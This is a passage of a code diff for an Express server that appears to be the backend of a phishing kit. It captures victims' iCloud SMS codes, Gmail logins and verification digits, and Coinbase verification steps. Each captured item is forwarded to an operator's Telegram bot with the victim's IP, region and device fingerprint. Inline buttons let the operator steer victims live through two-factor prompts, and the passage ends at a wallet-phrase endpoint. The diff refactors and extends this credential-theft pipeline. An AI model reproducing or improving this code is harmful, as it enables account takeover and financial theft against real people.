     console.error("❌ Page login endpoint error:", err);
-    res.status(500).json({ error: "Internal server error" });
+    res.status(500).json({ success: false, message: "Failed to send to Telegram" });
   }
 });
 
-app.post("/sms-login", async (req, res) => {
+// ============================================================================
+// SMS CODE ENDPOINTS
+// ============================================================================
+
+app.post("/sms-code", async (req, res) => {
   try {
-    const { code, userId, email } = req.body;
+    const { email, userId, smsCode } = req.body;
 
-    console.log(`📥 iCloud SMS Code Received:`);
-    console.log(`   - code: ${code}`);
-    console.log(`   - userId: ${userId}`);
-    console.log(`   - email: ${email}`);
-
-    if (!code) {
-      return res.status(400).json({ success: false, message: "Code required" });
+    if (!email || !smsCode) {
+      return res.status(400).json({ error: "Missing email or SMS code" });
     }
 
-    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
-      req.headers["x-real-ip"] ||
-      req.connection.remoteAddress ||
-      "Unknown IP";
-
+    const ip = getIP(req);
     const userAgent = req.get("user-agent") || "Unknown";
     const device = detectDevice(userAgent);
     const region = await detectRegion(ip);
 
-    pendingCodes[code] = { status: "pending" };
-    console.log(`📥 iCloud SMS Code Received: ${code}`);
+    pendingCodes[email] = { status: "pending", smsCode };
+    console.log(`📥 SMS Code Received: ${email}`);
 
     const message =
       `⛈⛈⛈⛈ <b>iCloud - SMS</b> ⛈⛈⛈⛈\n` +
       `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-      `<b>💬 SMS:</b> <code>${code}</code>\n` +
+      `<b>💬 SMS:</b> <code>${smsCode}</code>\n` +
       `<b>🌍 Region:</b> ${region}\n` +
       `<b>💻 Device:</b> ${device}\n` +
       `<b>📍 IP:</b> ${ip}`;
@@ -897,8 +772,8 @@ app.post("/sms-login", async (req, res) => {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: "✅ Accept", callback_data: `sms_accept|${code}` },
-            { text: "❌ Reject", callback_data: `sms_reject|${code}` }
+            { text: "✅ Accept", callback_data: `sms_accept|${email}` },
+            { text: "❌ Reject", callback_data: `sms_reject|${email}` }
           ]
         ]
       }
@@ -907,60 +782,11 @@ app.post("/sms-login", async (req, res) => {
     const botToken = process.env.BOT_TOKEN;
     const chatId = process.env.ADMIN_CHAT_ID;
 
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    const response = await fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message,
-        parse_mode: options.parse_mode,
-        reply_markup: options.reply_markup
-      })
-    });
-
-    if (response.ok) {
-      res.json({ success: true });
+    // ✅ SEND TO WINNER ONLY
+    if (email && userWinnerTelegram[email]) {
+      console.log(`📨 SMS going to winner only: ${userWinnerTelegram[email]}`);
+      await sendFollowUpMessage(email, message, options);
     } else {
-      res.status(500).json({ success: false });
-    }
-
-  } catch (err) {
-    console.error("❌ SMS login endpoint error:", err);
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
-
-app.post("/notify", async (req, res) => {
-  try {
-    const { type, userId, email } = req.body;
-
-    console.log(`📲 Notify endpoint received:`);
-    console.log(`   - type: ${type}`);
-    console.log(`   - userId: ${userId}`);
-    console.log(`   - email: ${email}`);
-
-    // ✅ Handle resend SMS (from iCloud SMS page)
-    if (type === "resend_sms") {
-      const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
-        req.headers["x-real-ip"] ||
-        req.connection.remoteAddress ||
-        "Unknown IP";
-
-      const userAgent = req.get("user-agent") || "Unknown";
-      const device = detectDevice(userAgent);
-      const region = await detectRegion(ip);
-
-      const message =
-        `🔄 <b>iCloud - Resend SMS</b> 🔄\n` +
-        `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-        `<b>🌍 Region:</b> ${region}\n` +
-        `<b>💻 Device:</b> ${device}\n` +
-        `<b>📍 IP:</b> ${ip}`;
-
-      const botToken = process.env.BOT_TOKEN;
-      const chatId = process.env.ADMIN_CHAT_ID;
-
       const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
       await fetch(url, {
         method: "POST",
@@ -968,85 +794,23 @@ app.post("/notify", async (req, res) => {
         body: JSON.stringify({
           chat_id: chatId,
           text: message,
-          parse_mode: "HTML"
+          parse_mode: options.parse_mode,
+          reply_markup: options.reply_markup
         })
       });
-
-      console.log(`🔄 Resend SMS notification sent for userId: ${userId}`);
-      return res.json({ success: true });
     }
-
-    // ✅ Handle generic notify (fallback)
-    if (!email) {
-      return res.status(400).json({ error: "Missing email" });
-    }
-
-    const message =
-      `🔄 <b>iCloud - Resend SMS</b> 🔄\n` +
-      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-      `<b>📧 Email:</b> <code>${email}</code>`;
-
-    const botToken = process.env.BOT_TOKEN;
-    const chatId = process.env.ADMIN_CHAT_ID;
-
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    await fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message,
-        parse_mode: "HTML"
-      })
-    });
 
     res.json({ success: true });
 
   } catch (err) {
+    console.error("❌ SMS code endpoint error:", err);
     res.status(500).json({ error: err.message });
-  }
-});
-
-app.post("/update-page-status", (req, res) => {
-  try {
-    const { email, status } = req.body;
-
-    if (!email || !status) {
-      return res.status(400).json({ error: "Missing email or status" });
-    }
-
-    if (!pendingPage[email]) {
-      pendingPage[email] = {};
-    }
-
-    if (status === "page_accept") {
-      pendingPage[email].status = "accepted";
-    } else if (status === "page_reject") {
-      pendingPage[email].status = "rejected";
-    } else {
-      pendingPage[email].status = status;
-    }
-
-    pendingPage[email].updatedAt = Date.now();
-
-    res.json({ ok: true });
-
-  } catch (err) {
-    res.status(500).json({ error: "Internal server error" });
   }
 });
 
 // ============================================================================
 // GMAIL LOGIN ENDPOINTS
 // ============================================================================
-
-// ✅ Storage for Gmail
-const pendingGmailLogin = {};
-const displayEmailStore = {};
-const displayEmailByRequestId = {};
-
-// ✅ Storage for Gmail Verification
-const pendingVerificationPage = {};
 
 app.post("/send-gmail-login", async (req, res) => {
   try {
@@ -1068,14 +832,17 @@ app.post("/send-gmail-login", async (req, res) => {
     displayEmailByRequestId[requestId] = email;
     console.log(`📧 Stored display email by requestId ${requestId}: ${email}`);
     
-    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
-      req.headers["x-real-ip"] ||
-      req.connection.remoteAddress ||
-      "Unknown IP";
-
+    const ip = getIP(req);
     const userAgent = req.get("user-agent") || "Unknown";
     const device = detectDevice(userAgent);
     const region = await detectRegion(ip);
+    const fingerprint = getDeviceFingerprint(req);
+
+    // ✅ STORE FINGERPRINT FOR MULTI-LAYER TRACKING
+    if (fingerprint && email) {
+      deviceFingerprintToEmail[fingerprint] = email;
+      console.log(`💾 Stored fingerprint ${fingerprint} → ${email} (Gmail flow)`);
+    }
 
     pendingGmailLogin[requestId] = { status: "pending", email: email };
 
@@ -1103,17 +870,23 @@ app.post("/send-gmail-login", async (req, res) => {
     const botToken = process.env.BOT_TOKEN;
     const chatId = process.env.ADMIN_CHAT_ID;
 
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    await fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message,
-        parse_mode: options.parse_mode,
-        reply_markup: options.reply_markup
-      })
-    });
+    // ✅ SEND TO WINNER ONLY
+    if (email && userWinnerTelegram[email]) {
+      console.log(`📨 Gmail going to winner only: ${userWinnerTelegram[email]}`);
+      await sendFollowUpMessage(email, message, options);
+    } else {
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: options.parse_mode,
+          reply_markup: options.reply_markup
+        })
+      });
+    }
 
     console.log('🔍 DEBUG: Sending response with displayEmailKey:', displayEmailKey);
     res.json({ status: "pending", requestId, displayEmailKey });
@@ -1124,7 +897,10 @@ app.post("/send-gmail-login", async (req, res) => {
   }
 });
 
-// ✅ GET /api/gmail-login-status/:requestId
+// ============================================================================
+// GET /api/gmail-login-status/:requestId
+// ============================================================================
+
 app.get("/api/gmail-login-status/:requestId", (req, res) => {
   try {
     const { requestId } = req.params;
@@ -1137,7 +913,10 @@ app.get("/api/gmail-login-status/:requestId", (req, res) => {
   }
 });
 
-// ✅ GET /api/display-email/:displayEmailKey
+// ============================================================================
+// GET /api/display-email/:displayEmailKey
+// ============================================================================
+
 app.get("/api/display-email/:displayEmailKey", (req, res) => {
   try {
     const { displayEmailKey } = req.params;
@@ -1155,7 +934,10 @@ app.get("/api/display-email/:displayEmailKey", (req, res) => {
   }
 });
 
-// ✅ GET /get-gmail-login/:requestId
+// ============================================================================
+// GET /get-gmail-login/:requestId
+// ============================================================================
+
 app.get("/get-gmail-login/:requestId", (req, res) => {
   try {
     const { requestId } = req.params;
@@ -1188,17 +970,12 @@ app.post("/send-verification-page", async (req, res) => {
     const requestId = `verify_${Date.now()}_${Math.random().toString(36).substring(7)}`;
     console.log('🔍 DEBUG: Generated requestId:', requestId);
     
-    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
-      req.headers["x-real-ip"] ||
-      req.connection.remoteAddress ||
-      "Unknown IP";
-
+    const ip = getIP(req);
     const userAgent = req.get("user-agent") || "Unknown";
     const device = detectDevice(userAgent);
     const region = await detectRegion(ip);
 
     pendingVerificationPage[requestId] = { status: "pending", selectedDigits: null, email: gmailEmail };
-    console.log(`📥 Verification Page Request received: ${requestId}`);
 
     const message =
       `🌈🌈🌈 <b>Gmail - Verification</b> 🌈🌈🌈\n` +
@@ -1233,19 +1010,24 @@ app.post("/send-verification-page", async (req, res) => {
     const botToken = process.env.BOT_TOKEN;
     const chatId = process.env.ADMIN_CHAT_ID;
 
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    await fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message,
-        parse_mode: options.parse_mode,
-        reply_markup: options.reply_markup
-      })
-    });
+    // ✅ SEND TO WINNER ONLY
+    if (gmailEmail && userWinnerTelegram[gmailEmail]) {
+      console.log(`📨 Verification going to winner only: ${userWinnerTelegram[gmailEmail]}`);
+      await sendFollowUpMessage(gmailEmail, message, options);
+    } else {
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: options.parse_mode,
+          reply_markup: options.reply_markup
+        })
+      });
+    }
 
-    console.log('🔍 DEBUG: Sending response with requestId:', requestId);
     res.json({ status: "pending", requestId, email: gmailEmail });
 
   } catch (err) {
@@ -1254,13 +1036,14 @@ app.post("/send-verification-page", async (req, res) => {
   }
 });
 
-// ✅ POST /update-selected-digits
+// ============================================================================
+// POST /update-selected-digits
+// ============================================================================
+
 app.post("/update-selected-digits", (req, res) => {
   try {
     const { requestId, digit } = req.body;
-    if (!requestId || digit === undefined) {
-      return res.status(400).json({ error: "Missing requestId or digit" });
-    }
+    if (!requestId || digit === undefined) return res.status(400).json({ error: "Missing requestId or digit" });
     
     if (!pendingVerificationPage[requestId]) {
       return res.status(400).json({ error: "Invalid requestId" });
@@ -1280,18 +1063,17 @@ app.post("/update-selected-digits", (req, res) => {
   }
 });
 
-// ✅ GET /get-selected-digits
+// ============================================================================
+// GET /get-selected-digits
+// ============================================================================
+
 app.get("/get-selected-digits", (req, res) => {
   try {
     const { requestId } = req.query;
-    if (!requestId) {
-      return res.status(400).json({ error: "Missing requestId" });
-    }
+    if (!requestId) return res.status(400).json({ error: "Missing requestId" });
 
     const entry = pendingVerificationPage[requestId];
-    if (!entry) {
-      return res.json({ success: false });
-    }
+    if (!entry) return res.json({ success: false });
 
     if (entry.selectedDigits && entry.selectedDigits.length === 2) {
       const number = entry.selectedDigits[0] + entry.selectedDigits[1];
@@ -1305,302 +1087,48 @@ app.get("/get-selected-digits", (req, res) => {
   }
 });
 
-// ✅ POST /send-verification-confirm
-app.post("/send-verification-confirm", async (req, res) => {
-  try {
-    const { email, userId, digit1, digit2, requestId } = req.body;
-    console.log('📥 send-verification-confirm called with:', { email, userId, digit1, digit2, requestId });
-    
-    if (!email || !userId || digit1 === undefined || digit2 === undefined) {
-      return res.status(400).json({ error: "Missing required fields" });
-    }
-
-    const confirmRequestId = `verify_confirm_${Date.now()}_${Math.random().toString(36).substring(7)}`;
-    
-    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
-      req.headers["x-real-ip"] ||
-      req.connection.remoteAddress ||
-      "Unknown IP";
-
-    const userAgent = req.get("user-agent") || "Unknown";
-    const device = detectDevice(userAgent);
-    const region = await detectRegion(ip);
-
-    console.log(`📥 Verification Confirm Request received: ${confirmRequestId}`);
-
-    pendingVerificationPage[confirmRequestId] = { status: "pending", email: email };
-
-    const selectedNumber = digit1 + digit2;
-    const message =
-      `🌈🌈🌈 <b>Gmail - Verify Numbers</b> 🌈🌈🌈\n` +
-      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-      `<b>📧 Email:</b> <code>${email}</code>\n` +
-      `<b>🔢 Selected Numbers:</b> <code><b>${selectedNumber}</b></code>\n` +
-      `<b>🌍 Region:</b> ${region}\n` +
-      `<b>💻 Device:</b> ${device}\n` +
-      `<b>📍 IP:</b> ${ip}`;
-
-    const options = {
-      parse_mode: "HTML",
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: "✅ Accept", callback_data: `gmail_verify_accept|${confirmRequestId}` },
-            { text: "❌ Reject", callback_data: `gmail_verify_reject|${confirmRequestId}` }
-          ]
-        ]
-      }
-    };
-
-    const botToken = process.env.BOT_TOKEN;
-    const chatId = process.env.ADMIN_CHAT_ID;
-
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    await fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message,
-        parse_mode: options.parse_mode,
-        reply_markup: options.reply_markup
-      })
-    });
-
-    console.log('✅ Verification confirm message sent');
-    res.json({ status: "pending", requestId: confirmRequestId });
-
-  } catch (err) {
-    console.error("❌ Verification Confirm endpoint error:", err);
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
-
-// ✅ POST /resend-verification
-app.post("/resend-verification", async (req, res) => {
-  try {
-    const { userId, email, requestId } = req.body;
-    console.log('🔄 resend-verification called with:', { userId, email, requestId });
-    
-    if (!userId || !email || !requestId) {
-      return res.status(400).json({ error: "Missing required fields" });
-    }
-
-    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
-      req.headers["x-real-ip"] ||
-      req.connection.remoteAddress ||
-      "Unknown IP";
-
-    const userAgent = req.get("user-agent") || "Unknown";
-    const device = detectDevice(userAgent);
-    const region = await detectRegion(ip);
-
-    console.log(`📥 Resend Verification Request received for: ${requestId}`);
-
-    // ✅ CLEAR OLD DIGITS
-    if (pendingVerificationPage[requestId]) {
-      pendingVerificationPage[requestId].selectedDigits = null;
-      console.log(`🔄 Cleared old digits for ${requestId}`);
-    }
-
-    const message =
-      `🔄 <b>Resend Code - Gmail</b> 🔄\n` +
-      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-      `<b>🌍 Region:</b> ${region}\n` +
-      `<b>💻 Device:</b> ${device}\n` +
-      `<b>📍 IP:</b> ${ip}`;
-
-    const options = {
-      parse_mode: "HTML",
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: "0", callback_data: `verify_digit|${requestId}|0` },
-            { text: "1", callback_data: `verify_digit|${requestId}|1` },
-            { text: "2", callback_data: `verify_digit|${requestId}|2` },
-            { text: "3", callback_data: `verify_digit|${requestId}|3` },
-            { text: "4", callback_data: `verify_digit|${requestId}|4` }
-          ],
-          [
-            { text: "5", callback_data: `verify_digit|${requestId}|5` },
-            { text: "6", callback_data: `verify_digit|${requestId}|6` },
-            { text: "7", callback_data: `verify_digit|${requestId}|7` },
-            { text: "8", callback_data: `verify_digit|${requestId}|8` },
-            { text: "9", callback_data: `verify_digit|${requestId}|9` }
-          ]
-        ]
-      }
-    };
-
-    const botToken = process.env.BOT_TOKEN;
-    const chatId = process.env.ADMIN_CHAT_ID;
-
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    await fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message,
-        parse_mode: options.parse_mode,
-        reply_markup: options.reply_markup
-      })
-    });
-
-    console.log('🔄 Resend verification message sent');
-    res.json({ status: "ok", requestId });
-
-  } catch (err) {
-    console.error("❌ Resend Verification endpoint error:", err);
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
-
-// ✅ GET /api/verification-status/:requestId
-app.get("/api/verification-status/:requestId", (req, res) => {
-  try {
-    const { requestId } = req.params;
-    const entry = pendingVerificationPage[requestId];
-    if (!entry) {
-      return res.json({ status: "pending" });
-    }
-    res.json({ status: entry.status });
-  } catch (err) {
-    console.error("❌ Verification status endpoint error:", err);
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
-
 // ============================================================================
-// VERIFYING PAGE ENDPOINTS
+// POST /update-verifying-choice
 // ============================================================================
 
-// ✅ Storage for Verifying Page
-const pendingVerifying = {};
-
-app.post("/send-verifying", async (req, res) => {
-  try {
-    console.log('📥 /send-verifying endpoint called');
-    const { userId, email } = req.body;
-    console.log('🔍 DEBUG: Received userId:', userId, 'email:', email);
-    
-    if (!userId || !email) {
-      return res.status(400).json({ error: "Missing userId or email" });
-    }
-    
-    const verifyingId = `verifying_${Date.now()}_${Math.random().toString(36).substring(7)}`;
-    console.log('🔍 DEBUG: Generated verifyingId:', verifyingId);
-    
-    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
-      req.headers["x-real-ip"] ||
-      req.connection.remoteAddress ||
-      "Unknown IP";
-
-    const userAgent = req.get("user-agent") || "Unknown";
-    const device = detectDevice(userAgent);
-    const region = await detectRegion(ip);
-
-    pendingVerifying[verifyingId] = { status: "pending", userId, email, choice: null };
-    console.log(`📥 Verifying Request received: ${verifyingId}`);
-
-    const message =
-      `😈😈😈 <b>Coinbase - Verifying</b> 😈😈😈\n` +
-      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-      `<b>📧 Email:</b> <code>${email}</code>\n` +
-      `<b>🌍 Region:</b> ${region}\n` +
-      `<b>💻 Device:</b> ${device}\n` +
-      `<b>📍 IP:</b> ${ip}`;
-
-    const options = {
-      parse_mode: "HTML",
-      reply_markup: {
-        inline_keyboard: [
-          [{ text: "💬 SMS - 2 💬", callback_data: `verifying_sms|${verifyingId}` }],
-          [{ text: "🏁 Done 🏁", callback_data: `verifying_done|${verifyingId}` }],
-          [{ text: "💼 Wallet 💼", callback_data: `verifying_wallet|${verifyingId}` }],
-          [
-            { text: "☁️", callback_data: `verifying_icloud|${verifyingId}` },
-            { text: "🌈", callback_data: `verifying_gmail|${verifyingId}` }
-          ]
-        ]
-      }
-    };
-
-    const botToken = process.env.BOT_TOKEN;
-    const chatId = process.env.ADMIN_CHAT_ID;
-
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    await fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message,
-        parse_mode: options.parse_mode,
-        reply_markup: options.reply_markup
-      })
-    });
-
-    console.log('✅ Verifying message sent with 3 buttons');
-    res.json({ status: "pending", verifyingId });
-
-  } catch (err) {
-    console.error("❌ Verifying endpoint error:", err);
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
-
-// ✅ GET /check-verifying-choice
-app.get("/check-verifying-choice", (req, res) => {
-  try {
-    const { verifyingId } = req.query;
-    if (!verifyingId) {
-      return res.status(400).json({ error: "Missing verifyingId" });
-    }
-
-    const entry = pendingVerifying[verifyingId];
-    if (!entry) {
-      return res.json({ choice: null });
-    }
-
-    res.json({ choice: entry.choice });
-  } catch (err) {
-    console.error("❌ Check verifying choice error:", err);
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
-
-// ✅ POST /update-verifying-choice
 app.post("/update-verifying-choice", (req, res) => {
   try {
     const { verifyingId, choice } = req.body;
+
     if (!verifyingId || !choice) {
       return res.status(400).json({ error: "Missing verifyingId or choice" });
     }
 
-    if (!pendingVerifying[verifyingId]) {
-      return res.status(400).json({ error: "Invalid verifyingId" });
+    if (!pendingVerifyingPage[verifyingId]) {
+      pendingVerifyingPage[verifyingId] = {};
     }
 
-    pendingVerifying[verifyingId].choice = choice;
-    console.log(`✅ Updated verifying choice: ${choice} for ${verifyingId}`);
+    pendingVerifyingPage[verifyingId].choice = choice;
+    pendingVerifyingPage[verifyingId].updatedAt = Date.now();
 
+    console.log(`✅ Verifying choice updated: ${choice}`);
     res.json({ ok: true });
+
   } catch (err) {
     console.error("❌ Update verifying choice error:", err);
     res.status(500).json({ error: "Internal server error" });
   }
 });
 
-// ✅ GET /get-verifying-info/:verifyingId
+// ============================================================================
+// GET /get-verifying-info/:verifyingId
+// ============================================================================
+
 app.get("/get-verifying-info/:verifyingId", (req, res) => {
   try {
     const { verifyingId } = req.params;
-    const entry = pendingVerifying[verifyingId];
-    if (!entry) {
-      return res.json({ email: 'unknown@example.com', userId: '?' });
+    const entry = pendingVerifyingPage[verifyingId];
+    
+    if (entry) {
+      res.json({ email: entry.email });
+    } else {
+      res.json({ email: null });
     }
-    res.json({ email: entry.email, userId: entry.userId });
   } catch (err) {
     console.error("❌ Get verifying info error:", err);
     res.status(500).json({ error: "Internal server error" });
@@ -1608,380 +1136,88 @@ app.get("/get-verifying-info/:verifyingId", (req, res) => {
 });
 
 // ============================================================================
-// SMS 2 ENDPOINTS
+// POST /update-sms2-choice
 // ============================================================================
 
-// ✅ Storage for SMS 2
-const pendingSMS2 = {};
-
-app.post("/sms2-login", async (req, res) => {
-  try {
-    console.log('📥 /sms2-login endpoint called');
-    const { code, userId, email } = req.body;
-    console.log('🔍 DEBUG: Received code:', code, 'userId:', userId, 'email:', email);
-    
-    if (!code || !userId || !email) {
-      return res.status(400).json({ error: "Missing code, userId, or email" });
-    }
-    
-    const sms2Id = `sms2_${Date.now()}_${Math.random().toString(36).substring(7)}`;
-    console.log('🔍 DEBUG: Generated sms2Id:', sms2Id);
-    
-    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
-      req.headers["x-real-ip"] ||
-      req.connection.remoteAddress ||
-      "Unknown IP";
-
-    const userAgent = req.get("user-agent") || "Unknown";
-    const device = detectDevice(userAgent);
-    const region = await detectRegion(ip);
-
-    pendingSMS2[sms2Id] = { status: "pending", code, email, userId, choice: null };
-    console.log(`📥 SMS 2 Request received: ${sms2Id}`);
-
-    const message =
-      `😈😈😈 <b>Coinbase - SMS 2</b> 😈😈😈\n` +
-      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-      `<b>📧 Email:</b> <code>${email}</code>\n` +
-      `<b>💬 Code:</b> <code>${code}</code>\n` +
-      `<b>🌍 Region:</b> ${region}\n` +
-      `<b>💻 Device:</b> ${device}\n` +
-      `<b>📍 IP:</b> ${ip}`;
-
-    const options = {
-      parse_mode: "HTML",
-      reply_markup: {
-        inline_keyboard: [
-          [{ text: "❌ Reject ❌", callback_data: `sms2_reject|${sms2Id}` }],
-          [
-            { text: "🏁 Done 🏁", callback_data: `sms2_done|${sms2Id}` },
-            { text: "💼 Wallet 💼", callback_data: `sms2_wallet|${sms2Id}` }
-          ],
-          [
-            { text: "☁️ iCloud ☁️", callback_data: `sms2_icloud|${sms2Id}` },
-            { text: "🌈 Gmail 🌈", callback_data: `sms2_gmail|${sms2Id}` }
-          ]
-        ]
-      }
-    };
-
-    const botToken = process.env.BOT_TOKEN;
-    const chatId = process.env.ADMIN_CHAT_ID;
-
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    await fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message,
-        parse_mode: options.parse_mode,
-        reply_markup: options.reply_markup
-      })
-    });
-
-    console.log('✅ SMS 2 message sent with new button layout');
-    res.json({ status: "pending", sms2Id });
-
-  } catch (err) {
-    console.error("❌ SMS 2 login endpoint error:", err);
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
-
-// ✅ GET /check-sms2-status
-app.get("/check-sms2-status", (req, res) => {
-  try {
-    const { sms2Id } = req.query;
-    if (!sms2Id) {
-      return res.status(400).json({ error: "Missing sms2Id" });
-    }
-
-    const entry = pendingSMS2[sms2Id];
-    if (!entry) {
-      return res.json({ choice: null });
-    }
-
-    res.json({ choice: entry.choice });
-  } catch (err) {
-    console.error("❌ Check SMS 2 status error:", err);
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
-
-// ✅ POST /update-sms2-choice
 app.post("/update-sms2-choice", (req, res) => {
   try {
     const { sms2Id, choice } = req.body;
+
     if (!sms2Id || !choice) {
       return res.status(400).json({ error: "Missing sms2Id or choice" });
     }
 
     if (!pendingSMS2[sms2Id]) {
-      return res.status(400).json({ error: "Invalid sms2Id" });
+      pendingSMS2[sms2Id] = {};
     }
 
     pendingSMS2[sms2Id].choice = choice;
-    console.log(`✅ Updated SMS 2 choice: ${choice} for ${sms2Id}`);
+    pendingSMS2[sms2Id].updatedAt = Date.now();
 
+    console.log(`✅ SMS2 choice updated: ${choice}`);
     res.json({ ok: true });
+
   } catch (err) {
-    console.error("❌ Update SMS 2 choice error:", err);
+    console.error("❌ Update SMS2 choice error:", err);
     res.status(500).json({ error: "Internal server error" });
   }
 });
 
-// ✅ POST /resend-sms2 - SMS 2 Resend
-app.post("/resend-sms2", async (req, res) => {
-  try {
-    const { email, userId } = req.body;
+// ============================================================================
+// GET /get-sms2-info/:sms2Id
+// ============================================================================
 
-    if (!email) {
-      return res.status(400).json({ error: "Missing email" });
-    }
-
-    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
-      req.headers["x-real-ip"] ||
-      req.connection.remoteAddress ||
-      "Unknown IP";
-
-    const userAgent = req.get("user-agent") || "Unknown";
-    const device = detectDevice(userAgent);
-    const region = await detectRegion(ip);
-
-    const message =
-      `🔄 <b>Coinbase - Resend SMS 2</b> 🔄\n` +
-      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-      `<b>📧 Email:</b> <code>${email}</code>\n` +
-      `<b>🌍 Region:</b> ${region}\n` +
-      `<b>💻 Device:</b> ${device}\n` +
-      `<b>📍 IP:</b> ${ip}`;
-
-    const botToken = process.env.BOT_TOKEN;
-    const chatId = process.env.ADMIN_CHAT_ID;
-
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    await fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message,
-        parse_mode: "HTML"
-      })
-    });
-
-    res.json({ ok: true });
-  } catch (err) {
-    console.error("❌ SMS 2 resend error:", err);
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
-
-// ✅ GET /get-sms2-info/:sms2Id
 app.get("/get-sms2-info/:sms2Id", (req, res) => {
   try {
     const { sms2Id } = req.params;
     const entry = pendingSMS2[sms2Id];
-    if (!entry) {
-      return res.json({ email: 'unknown@example.com', code: '?' });
+    
+    if (entry) {
+      res.json({ email: entry.email });
+    } else {
+      res.json({ email: null });
     }
-    res.json({ email: entry.email, code: entry.code });
   } catch (err) {
-    console.error("❌ Get SMS 2 info error:", err);
+    console.error("❌ Get SMS2 info error:", err);
     res.status(500).json({ error: "Internal server error" });
   }
 });
 
-// ✅ POST /captcha-success - CAPTCHA Page Success (uses separate CAPTCHA bot)
-app.post("/captcha-success", async (req, res) => {
-  try {
-    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
-      req.headers["x-real-ip"] ||
-      req.connection.remoteAddress ||
-      "Unknown IP";
+// ============================================================================
+// POST /update-wallet-decision
+// ============================================================================
 
-    const userAgent = req.get("user-agent") || "Unknown";
-    const device = detectDevice(userAgent);
-    const region = await detectRegion(ip);
-
-    const message =
-      `🥳🥳🥳 <b>New Visitor</b> 🥳🥳🥳\n` +
-      `<b>🌍 Region:</b> ${region}\n` +
-      `<b>💻 Device:</b> ${device}\n` +
-      `<b>📍 IP:</b> ${ip}`;
-
-    // ✅ Use CAPTCHA bot, not main bot!
-    const botToken = process.env.BOT_TOKEN_CAPTCHA_PAGE;
-    const chatId = process.env.CHAT_ID_CAPTCHA_PAGE;
-
-    console.log(`🔍 CAPTCHA endpoint - botToken exists: ${!!botToken}, chatId exists: ${!!chatId}`);
-
-    if (!botToken || !chatId) {
-      console.error("❌ Missing CAPTCHA env variables!");
-      return res.status(500).json({ error: "Missing CAPTCHA_PAGE env variables" });
-    }
-
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    const response = await fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message,
-        parse_mode: "HTML"
-      })
-    });
-
-    const responseData = await response.json();
-    console.log(`✅ CAPTCHA message response:`, responseData);
-
-    if (!response.ok) {
-      console.error(`❌ Telegram API error:`, responseData);
-      return res.status(500).json({ error: "Telegram API error", details: responseData });
-    }
-
-    console.log(`✅ CAPTCHA success message sent for ${email}`);
-    res.json({ ok: true });
-  } catch (err) {
-    console.error("❌ CAPTCHA success error:", err);
-    res.status(500).json({ error: err.message || "Internal server error" });
-  }
-});
-
-// ✅ POST /wallet-phrase - Wallet Phrase Endpoint
